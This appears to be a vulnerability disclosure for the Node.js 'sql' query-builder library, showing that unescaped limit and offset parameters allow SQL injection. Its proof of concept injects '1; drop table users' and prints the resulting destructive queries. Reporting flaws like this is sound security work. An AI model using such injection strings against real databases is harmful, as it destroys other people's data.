Summary:

I would like to report an SQLi in `sql`.

It allows to insert potentially user-controlled content into the queries without proper escaping, in cases where that is not verified additionally in the applications that are using `sql` library.

# Vulnerability

## Vulnerability Description

`sql` module constructs SQL queries from structured input, and the problem is that it doesn't do proper escaping of limit/offset parameters, so in setups where those are user-controlled (e.g. received over network) without additional validation that can cause an SQL injection vulnerability.

## Steps To Reproduce:

```js
var sql = require('sql');
var user = sql.define({
  name: 'users',
  columns: ['id', 'name', 'email', 'lastLogin']
});
console.log(user.select(user.star()).from(user).limit('1; drop table users').toQuery().text);
console.log(user.select(user.star()).from(user).offset('1; drop table users').toQuery().text);
```

Output:
```
SELECT "users".* FROM "users" LIMIT 1; drop table users
SELECT "users".* FROM "users" OFFSET 1; drop table users
```
